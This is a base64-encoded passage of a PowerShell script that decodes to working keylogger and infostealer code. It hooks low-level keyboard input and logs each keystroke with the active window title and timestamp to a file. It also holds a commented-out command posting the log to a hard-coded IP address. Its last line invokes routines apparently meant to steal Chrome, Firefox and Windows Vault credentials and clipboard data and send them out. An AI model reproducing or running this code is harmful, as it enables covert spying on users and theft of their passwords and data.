4ODAwMCkgeyAkU2hpZnQgPSAkdHJ1ZSB9CgkJCQllbHNlIHsgJFNoaWZ0ID0gJGZhbHNlIH0KCQoJCQkJJENhcHMgPSBbQ29uc29sZV06OkNhcHNMb2NrCgkKCQkJCSMgUmVhZCB2aXJ0dWFsLWtleSBmcm9tIGJ1ZmZlcgoJCQkJJHZLZXkgPSBbV2luZG93cy5Gb3Jtcy5LZXlzXVtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCRsUGFyYW0pCgkKCQkJCSMgUGFyc2UgdmlydHVhbC1rZXkKCQkJCWlmICgkdktleSAtZ3QgNjQgLWFuZCAkdktleSAtbHQgOTEpIHsgIyBBbHBoYWJldCBjaGFyYWN0ZXJzCgkJCQkJaWYgKCRTaGlmdCAteG9yICRDYXBzKSB7ICRLZXkgPSAkdktleS5Ub1N0cmluZygpIH0KCQkJCQllbHNlIHsgJEtleSA9ICR2S2V5LlRvU3RyaW5nKCkuVG9Mb3dlcigpIH0KCQkJCX0KCQkJCWVsc2VpZiAoJHZLZXkgLWdlIDk2IC1hbmQgJHZLZXkgLWxlIDExMSkgeyAjIE51bWJlciBwYWQgY2hhcmFjdGVycwoJCQkJCXN3aXRjaCAoJHZLZXkudmFsdWVfXykgewoJCQkJCQk5NiB7ICRLZXkgPSAnMCcgfQoJCQkJCQk5NyB7ICRLZXkgPSAnMScgfQoJCQkJCQk5OCB7ICRLZXkgPSAnMicgfQoJCQkJCQk5OSB7ICRLZXkgPSAnMycgfQoJCQkJCQkxMDAgeyAkS2V5ID0gJzQnIH0KCQkJCQkJMTAxIHsgJEtleSA9ICc1JyB9CgkJCQkJCTEwMiB7ICRLZXkgPSAnNicgfQoJCQkJCQkxMDMgeyAkS2V5ID0gJzcnIH0KCQkJCQkJMTA0IHsgJEtleSA9ICc4JyB9CgkJCQkJCTEwNSB7ICRLZXkgPSAnOScgfQoJCQkJCQkxMDYgeyAkS2V5ID0gIioiIH0KCQkJCQkJMTA3IHsgJEtleSA9ICIrIiB9CgkJCQkJCTEwOCB7ICRLZXkgPSAifCIgfQoJCQkJCQkxMDkgeyAkS2V5ID0gIi0iIH0KCQkJCQkJMTEwIHsgJEtleSA9ICIuIiB9CgkJCQkJCTExMSB7ICRLZXkgPSAiLyIgfQoJCQkJCX0KCQkJCX0KCQkJCWVsc2VpZiAoKCR2S2V5IC1nZSA0OCAtYW5kICR2S2V5IC1sZSA1NykgLW9yICgkdktleSAtZ2UgMTg2IC1hbmQgJHZLZXkgLWxlIDE5MikgLW9yICgkdktleSAtZ2UgMjE5IC1hbmQgJHZLZXkgLWxlIDIyMikpIHsgICAgICAgICAgICAgICAgICAgICAgCgkJCQkJaWYgKCRTaGlmdCkgeyAgICAgICAgICAgICAgICAgICAgICAgICAgIAoJCQkJCQlzd2l0Y2ggKCR2S2V5LnZhbHVlX18pIHsgIyBTaGlmdGFibGUgY2hhcmFjdGVycwoJCQkJCQkJNDggeyAkS2V5ID0gJyknIH0KCQkJCQkJCTQ5IHsgJEtleSA9ICchJyB9CgkJCQkJCQk1MCB7ICRLZXkgPSAnQCcgfQoJCQkJCQkJNTEgeyAkS2V5ID0gJyMnIH0KCQkJCQkJCTUyIHsgJEtleSA9ICckJyB9CgkJCQkJCQk1MyB7ICRLZXkgPSAnJScgfQoJCQkJCQkJNTQgeyAkS2V5ID0gJ14nIH0KCQkJCQkJCTU1IHsgJEtleSA9ICcmJyB9CgkJCQkJCQk1NiB7ICRLZXkgPSAnKicgfQoJCQkJCQkJNTcgeyAkS2V5ID0gJygnIH0KCQkJCQkJCTE4NiB7ICRLZXkgPSAnOicgfQoJCQkJCQkJMTg3IHsgJEtleSA9ICcrJyB9CgkJCQkJCQkxODggeyAkS2V5ID0gJzwnIH0KCQkJCQkJCTE4OSB7ICRLZXkgPSAnXycgfQoJCQkJCQkJMTkwIHsgJEtleSA9ICc+JyB9CgkJCQkJCQkxOTEgeyAkS2V5ID0gJz8nIH0KCQkJCQkJCTE5MiB7ICRLZXkgPSAnficgfQoJCQkJCQkJMjE5IHsgJEtleSA9ICd7JyB9CgkJCQkJCQkyMjAgeyAkS2V5ID0gJ3wnIH0KCQkJCQkJCTIyMSB7ICRLZXkgPSAnfScgfQoJCQkJCQkJMjIyIHsgJEtleSA9ICc8RG91YmxlIFF1b3Rlcz4nIH0KCQkJCQkJfQoJCQkJCX0KCQkJCQllbHNlIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAKCQkJCQkJc3dpdGNoICgkdktleS52YWx1ZV9fKSB7CgkJCQkJCQk0OCB7ICRLZXkgPSAnMCcgfQoJCQkJCQkJNDkgeyAkS2V5ID0gJzEnIH0KCQkJCQkJCTUwIHsgJEtleSA9ICcyJyB9CgkJCQkJCQk1MSB7ICRLZXkgPSAnMycgfQoJCQkJCQkJNTIgeyAkS2V5ID0gJzQnIH0KCQkJCQkJCTUzIHsgJEtleSA9ICc1JyB9CgkJCQkJCQk1NCB7ICRLZXkgPSAnNicgfQoJCQkJCQkJNTUgeyAkS2V5ID0gJzcnIH0KCQkJCQkJCTU2IHsgJEtleSA9ICc4JyB9CgkJCQkJCQk1NyB7ICRLZXkgPSAnOScgfQoJCQkJCQkJMTg2IHsgJEtleSA9ICc7JyB9CgkJCQkJCQkxODcgeyAkS2V5ID0gJz0nIH0KCQkJCQkJCTE4OCB7ICRLZXkgPSAnLCcgfQoJCQkJCQkJMTg5IHsgJEtleSA9ICctJyB9CgkJCQkJCQkxOTAgeyAkS2V5ID0gJy4nIH0KCQkJCQkJCTE5MSB7ICRLZXkgPSAnLycgfQoJCQkJCQkJMTkyIHsgJEtleSA9ICdgJyB9CgkJCQkJCQkyMTkgeyAkS2V5ID0gJ1snIH0KCQkJCQkJCTIyMCB7ICRLZXkgPSAnXCcgfQoJCQkJCQkJMjIxIHsgJEtleSA9ICddJyB9CgkJCQkJCQkyMjIgeyAkS2V5ID0gJzxTaW5nbGUgUXVvdGU+JyB9CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQllbHNlIHsKCQkJCQlzd2l0Y2ggKCR2S2V5KSB7CgkJCQkJCSRLZXlzOjpGMSAgeyAkS2V5ID0gJzxGMT4nIH0KCQkJCQkJJEtleXM6OkYyICB7ICRLZXkgPSAnPEYyPicgfQoJCQkJCQkkS2V5czo6RjMgIHsgJEtleSA9ICc8RjM+JyB9CgkJCQkJCSRLZXlzOjpGNCAgeyAkS2V5ID0gJzxGND4nIH0KCQkJCQkJJEtleXM6OkY1ICB7ICRLZXkgPSAnPEY1PicgfQoJCQkJCQkkS2V5czo6RjYgIHsgJEtleSA9ICc8RjY+JyB9CgkJCQkJCSRLZXlzOjpGNyAgeyAkS2V5ID0gJzxGNz4nIH0KCQkJCQkJJEtleXM6OkY4ICB7ICRLZXkgPSAnPEY4PicgfQoJCQkJCQkkS2V5czo6RjkgIHsgJEtleSA9ICc8Rjk+JyB9CgkJCQkJCSRLZXlzOjpGMTAgeyAkS2V5ID0gJzxGMTA+JyB9CgkJCQkJCSRLZXlzOjpGMTEgeyAkS2V5ID0gJzxGMTE+JyB9CgkJCQkJCSRLZXlzOjpGMTIgeyAkS2V5ID0gJzxGMTI+JyB9CgkJCQoJCQkJCQkkS2V5czo6U25hcHNob3QgICAgeyAkS2V5ID0gJzxQcmludCBTY3JlZW4+JyB9CgkJCQkJCSRLZXlzOjpTY3JvbGwgICAgICB7ICRLZXkgPSAnPFNjcm9sbCBMb2NrPicgfQoJCQkJCQkkS2V5czo6UGF1c2UgICAgICAgeyAkS2V5ID0gJzxQYXVzZS9CcmVhaz4nIH0KCQkJCQkJJEtleXM6Okluc2VydCAgICAgIHsgJEtleSA9ICc8SW5zZXJ0PicgfQoJCQkJCQkkS2V5czo6SG9tZSAgICAgICAgeyAkS2V5ID0gJzxIb21lPicgfQoJCQkJCQkkS2V5czo6RGVsZXRlICAgICAgeyAkS2V5ID0gJzxEZWxldGU+JyB9CgkJCQkJCSRLZXlzOjpFbmQgICAgICAgICB7ICRLZXkgPSAnPEVuZD4nIH0KCQkJCQkJJEtleXM6OlByaW9yICAgICAgIHsgJEtleSA9ICc8UGFnZSBVcD4nIH0KCQkJCQkJJEtleXM6Ok5leHQgICAgICAgIHsgJEtleSA9ICc8UGFnZSBEb3duPicgfQoJCQkJCQkkS2V5czo6RXNjYXBlICAgICAgeyAkS2V5ID0gJzxFc2M+JyB9CgkJCQkJCSRLZXlzOjpOdW1Mb2NrICAgICB7ICRLZXkgPSAnPE51bSBMb2NrPicgfQoJCQkJCQkkS2V5czo6Q2FwaXRhbCAgICAgeyAkS2V5ID0gJzxDYXBzIExvY2s+JyB9CgkJCQkJCSRLZXlzOjpUYWIgICAgICAgICB7ICRLZXkgPSAnPFRhYj4nIH0KCQkJCQkJJEtleXM6OkJhY2sgICAgICAgIHsgJEtleSA9ICc8QmFja3NwYWNlPicgfQoJCQkJCQkkS2V5czo6RW50ZXIgICAgICAgeyAkS2V5ID0gJzxFbnRlcj4nIH0KCQkJCQkJJEtleXM6OlNwYWNlICAgICAgIHsgJEtleSA9ICc8ID4nIH0KCQkJCQkJJEtleXM6OkxlZnQgICAgICAgIHsgJEtleSA9ICc8TGVmdD4nIH0KCQkJCQkJJEtleXM6OlVwICAgICAgICAgIHsgJEtleSA9ICc8VXA+JyB9CgkJCQkJCSRLZXlzOjpSaWdodCAgICAgICB7ICRLZXkgPSAnPFJpZ2h0PicgfQoJCQkJCQkkS2V5czo6RG93biAgICAgICAgeyAkS2V5ID0gJzxEb3duPicgfQoJCQkJCQkkS2V5czo6TE1lbnUgICAgICAgeyAkS2V5ID0gJzxBbHQ+JyB9CgkJCQkJCSRLZXlzOjpSTWVudSAgICAgICB7ICRLZXkgPSAnPEFsdD4nIH0KCQkJCQkJJEtleXM6OkxXaW4gICAgICAgIHsgJEtleSA9ICc8V2luZG93cyBLZXk+JyB9CgkJCQkJCSRLZXlzOjpSV2luICAgICAgICB7ICRLZXkgPSAnPFdpbmRvd3MgS2V5PicgfQoJCQkJCQkkS2V5czo6TFNoaWZ0S2V5ICAgeyAkS2V5ID0gJzxTaGlmdD4nIH0KCQkJCQkJJEtleXM6OlJTaGlmdEtleSAgIHsgJEtleSA9ICc8U2hpZnQ+JyB9CgkJCQkJCSRLZXlzOjpMQ29udHJvbEtleSB7ICRLZXkgPSAnPEN0cmw+JyB9CgkJCQkJCSRLZXlzOjpSQ29udHJvbEtleSB7ICRLZXkgPSAnPEN0cmw+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpNb3VzZUNsaWNrICB7ICRLZXkgPSAnPExNb3VzZT4nIH0KCQkJCQl9CgkJCQl9CgkKCQkJCSMgR2V0IGZvcmVncm91bmQgd2luZG93J3MgdGl0bGUKCQkJCSRUaXRsZSA9IE5ldy1PYmplY3QgVGV4dC5TdHJpbmdidWlsZGVyIDI1NgoJCQkJJEdldFdpbmRvd1RleHQuSW52b2tlKCRoV2luZG93LCAkVGl0bGUsICRUaXRsZS5DYXBhY2l0eSkKCQoJCQkJIyBEZWZpbmUgb2JqZWN0IHByb3BlcnRpZXMKCQkJCSRQcm9wcyA9IEB7CgkJCQkJS2V5ID0gJEtleQoJCQkJCVRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cKCQkJCQlXaW5kb3cgPSAkVGl0bGUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgIAoJCQkJfQoJCgkJCQkkb2JqID0gTmV3LU9iamVjdCBwc29iamVjdCAtUHJvcGVydHkgJFByb3BzCgkJCQoJCQkJIyBIYWNrIHNpbmNlIEV4cG9ydC1DU1YgZG9lc24ndCBoYXZlIGFuIGFwcGVuZCBzd2l0Y2ggaW4gUFN2MgoJCQkJJENTVkVudHJ5ID0gKCRvYmogfCBTZWxlY3QtT2JqZWN0IEtleSxXaW5kb3csVGltZSB8IENvbnZlcnRUby1Dc3YgLU5vVHlwZUluZm9ybWF0aW9uKVsxXSsnW11ubCcKICAgICAgICAgICAgICAgICNJbnZva2UtV2ViUmVxdWVzdCAtdXJpICJodHRwOi8vNDUuNzkuMTczLjIzMjo5MDAyL2xvZyIgLU1ldGhvZCBQT1NUIC1Cb2R5ICRKU09OCgkJCQlPdXQtRmlsZSAtRmlsZVBhdGggJExvZ1BhdGggLUFwcGVuZCAtSW5wdXRPYmplY3QgJENTVkVudHJ5IC1FbmNvZGluZyB1bmljb2RlCgkJCX0KCQkJcmV0dXJuICRDYWxsTmV4dEhvb2tFeC5JbnZva2UoW0ludFB0cl06Olplcm8sICRDb2RlLCAkd1BhcmFtLCAkbFBhcmFtKQoJCX0KCQoJCSMgQ2FzdCBzY3JpcHRibG9jayBhcyBMb3dMZXZlbEtleWJvYXJkUHJvYyBjYWxsYmFjawoJCSREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKCQkkQ2FsbGJhY2sgPSAkQ2FsbGJhY2tTY3JpcHQgLWFzICREZWxlZ2F0ZQoJCgkJIyBHZXQgaGFuZGxlIHRvIFBvd2VyU2hlbGwgZm9yIGhvb2sKCQkkUG9zaE1vZHVsZSA9IChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuTWFpbk1vZHVsZS5Nb2R1bGVOYW1lCgkJJE1vZHVsZUhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRQb3NoTW9kdWxlKQoJCgkJIyBTZXQgV01fS0VZQk9BUkRfTEwgaG9vawoJCSRIb29rID0gJFNldFdpbmRvd3NIb29rRXguSW52b2tlKDB4RCwgJENhbGxiYWNrLCAkTW9kdWxlSGFuZGxlLCAwKQoJCgkJJFN0b3B3YXRjaCA9IFtEaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCgkKCQl3aGlsZSAoJHRydWUpIHsKCQkJaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5UaW1lb3V0IC1hbmQgKCRTdG9wd2F0Y2guRWxhcHNlZC5Ub3RhbE1pbnV0ZXMgLWd0ICRUaW1lb3V0KSkgeyBicmVhayB9CgkJCSRQZWVrTWVzc2FnZS5JbnZva2UoW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvLCAweDEwMCwgMHgxMDksIDApCgkJCVN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAKCQl9CgkKCQkkU3RvcHdhdGNoLlN0b3AoKQoJCgkJIyBSZW1vdmUgdGhlIGhvb2sKCQkkVW5ob29rV2luZG93c0hvb2tFeC5JbnZva2UoJEhvb2spCgl9CgkKCSMgU2V0dXAgS2V5TG9nZ2VyJ3MgcnVuc3BhY2UKCSRQb3dlclNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQoJW3ZvaWRdJFBvd2VyU2hlbGwuQWRkU2NyaXB0KCRTY3JpcHQpCglbdm9pZF0kUG93ZXJTaGVsbC5BZGRBcmd1bWVudCgkTG9nUGF0aCkKCWlmICgkUFNCb3VuZFBhcmFtZXRlcnMuVGltZW91dCkgeyBbdm9pZF0kUG93ZXJTaGVsbC5BZGRBcmd1bWVudCgkVGltZW91dCkgfQoJCgkjIFN0YXJ0IEtleUxvZ2dlcgoJW3ZvaWRdJFBvd2VyU2hlbGwuQmVnaW5JbnZva2UoKQoJCglpZiAoJFBhc3NUaHJ1LklzUHJlc2VudCkgeyByZXR1cm4gJFBvd2VyU2hlbGwgfQp9CgpHZXQtS2V5c3Ryb2tlczsgVGl0bGUtTW9uaXRvcjsgV2ViR2V0OyBHZXRDaHJvbWU7IEdldEZGOyBHZXRWYXVsdDsgR2NsaXA7IFdlYlBvc3Q=
